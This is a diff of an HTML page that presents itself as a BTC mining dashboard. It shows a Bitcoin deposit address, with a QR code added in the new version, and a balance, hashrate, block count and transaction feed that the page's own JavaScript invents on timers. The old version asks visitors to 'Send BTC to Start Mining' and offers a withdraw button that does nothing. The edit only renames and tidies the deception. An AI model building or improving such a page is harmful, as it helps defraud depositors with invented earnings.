@@ -2,113 +2,120 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>HashFlow BTC Mining Dashboard</title>
+<title>HashFlow BTC Monitoring Dashboard</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body{margin:0;padding:0;font-family:Arial,sans-serif;background:#0b0f1a;color:white;text-align:center;}
-.card{max-width:95%;margin:15px auto;padding:20px;border-radius:12px;background:#131a2e;box-shadow:0 0 15px rgba(0,0,0,0.5);}
-h2{color:#f2a900;margin-bottom:10px;}
-.btc{font-size:28px;margin:12px 0;word-break:break-all;}
-.stats-box{display:flex;justify-content:space-around;flex-wrap:wrap;margin-top:10px;}
-.stats-box div{background:#0b0f1a;padding:10px 15px;border-radius:8px;margin:5px;flex:1;min-width:100px;}
-canvas{width:100%;height:140px;background:#0b0f1a;border-radius:8px;margin-top:15px;display:block;}
-.tx-container{max-height:250px;overflow:hidden;margin-top:10px;border-radius:6px;background:#0b0f1a;padding:10px;text-align:left;font-size:13px;line-height:1.5;}
-.tx-entry{display:flex;justify-content:space-between;padding:4px 6px;border-bottom:1px solid #222;}
+body{margin:0;padding:0;font-family:Arial,sans-serif;background:#0b0f1a;color:white;}
+.card{
+  max-width:95%;
+  margin:15px auto;
+  padding:20px;
+  border-radius:12px;
+  background:#131a2e;
+}
+h2{color:#f2a900;text-align:center;}
+.btc{
+  font-size:28px;
+  text-align:center;
+  margin:10px 0;
+}
+.stats{
+  display:flex;
+  justify-content:space-around;
+  flex-wrap:wrap;
+}
+.stats div{
+  background:#0b0f1a;
+  padding:10px;
+  margin:5px;
+  border-radius:8px;
+}
+.tx-container{
+  max-height:260px;
+  overflow:hidden;
+  background:#0b0f1a;
+  padding:10px;
+  border-radius:8px;
+  font-size:13px;
+}
+.tx{
+  display:flex;
+  justify-content:space-between;
+  padding:4px 0;
+  border-bottom:1px solid #222;
+}
 .green{color:#00ff99;}
-.yellow{color:#ffff66;}
-.btc-box{background:#0b0f1a;padding:10px;border-radius:6px;word-break:break-all;margin:10px 0;font-size:14px;}
-input{width:100%;padding:10px;margin:10px 0;border-radius:6px;border:none;font-size:14px;}
-button{padding:10px 18px;margin:10px 5px;background:#f2a900;border:none;color:black;font-weight:bold;border-radius:6px;cursor:pointer;}
-.progress-container{width:100%;background:#222;border-radius:8px;margin-top:15px;height:20px;}
-.progress-bar{height:20px;background:#f2a900;width:0%;border-radius:8px;}
+.yellow{color:#ffcc66;}
+.btc-box{
+  background:#0b0f1a;
+  padding:10px;
+  border-radius:8px;
+  word-break:break-all;
+  text-align:center;
+}
+button{
+  background:#f2a900;
+  border:none;
+  padding:10px 16px;
+  border-radius:6px;
+  font-weight:bold;
+  cursor:pointer;
+}
 </style>
 </head>
 <body>
 
-<!-- BTC Deposit -->
 <div class="card">
-<h2>Send BTC to Start Mining</h2>
-<div class="btc-box">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
-<button onclick="navigator.clipboard.writeText('bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav')">
-Copy Address
-</button>
+  <h2>BTC Deposit Address</h2>
+  <div class="btc-box">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
+  <div style="text-align:center;margin-top:10px;">
+    <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
+  </div>
 </div>
 
-<!-- Mining Dashboard -->
 <div class="card">
-<h2>Mining Dashboard</h2>
-
-<p style="font-size:13px;opacity:0.8;margin-top:-6px;">
-Verification required to access dashboard
-</p>
-
-<p>Status: <span class="green">ACTIVE</span></p>
-
-<div class="btc" id="btc">0.00000000 BTC</div>
-
-<div class="stats-box">
-<div>Hashrate: 120 TH/s</div>
-<div>Blocks: 0</div>
-<div>Uptime: 0h 0m</div>
+  <h2>Monitoring Dashboard</h2>
+  <div class="btc" id="balance">0.00000000 BTC</div>
+  <div class="stats">
+    <div>Hashrate: 120 TH/s</div>
+    <div>Blocks: <span id="blocks">0</span></div>
+    <div>Uptime: <span id="uptime">0h 0m</span></div>
+  </div>
 </div>
 
-<div class="progress-container">
-<div class="progress-bar" id="progressBar"></div>
-</div>
-
-<canvas id="chart"></canvas>
-</div>
-
-<!-- Withdraw -->
 <div class="card">
-<h2>Withdraw BTC</h2>
-<input type="text" placeholder="Enter BTC withdrawal address">
-<button>Withdraw</button>
-</div>
-
-<!-- Recent Activity -->
-<div class="card">
-<h2>Recent Activity</h2>
-<div class="tx-container" id="txContainer"></div>
+  <h2>Recent Activity</h2>
+  <div class="tx-container" id="txs"></div>
 </div>
 
 <script>
-let balance=0;
-let rate=0.0000001;
-let paused=false;
-let txContainer=document.getElementById("txContainer");
+let balance = 0;
+let blocks = 0;
+let minutes = 0;
+const txs = document.getElementById("txs");
 
 setInterval(()=>{
- if(!paused){
-  balance+=rate;
-  document.getElementById("btc").innerText=balance.toFixed(8)+" BTC";
- }
+  balance += 0.00000008;
+  document.getElementById("balance").innerText = balance.toFixed(8)+" BTC";
 },1000);
 
 setInterval(()=>{
- let tx=document.createElement("div");
- tx.className="tx-entry";
- let val=(Math.random()*0.0005+0.00001).toFixed(8);
- let status=Math.random()>0.4?"Completed":"Pending";
- tx.innerHTML=`<span>+${val} BTC</span><span class="${status=="Completed"?"green":"yellow"}">${status}</span>`;
- txContainer.prepend(tx);
+  const tx = document.createElement("div");
+  tx.className="tx";
+  const val = (Math.random()*0.0004+0.00002).toFixed(8);
+  const status = Math.random()>0.5 ? "Completed" : "Pending";
+  tx.innerHTML = `<span>+${val} BTC</span><span class="${status==="Completed"?"green":"yellow"}">${status}</span>`;
+  txs.prepend(tx);
+  if(txs.children.length>500) txs.removeChild(txs.lastChild);
 },1500);
 
 setInterval(()=>{
- paused=true;
- setTimeout(()=>paused=false,60000);
-},900000);
-
-setInterval(()=>{
- balance*=0.995;
-},3600000);
-
-let progress=0;
-setInterval(()=>{
- progress+=1;
- if(progress>100) progress=0;
- document.getElementById("progressBar").style.width=progress+"%";
-},500);
+  blocks += Math.floor(Math.random()*2);
+  minutes++;
+  document.getElementById("blocks").innerText = blocks;
+  document.getElementById("uptime").innerText =
+    Math.floor(minutes/60)+"h "+(minutes%60)+"m";
+},60000);
 </script>
 
 </body>
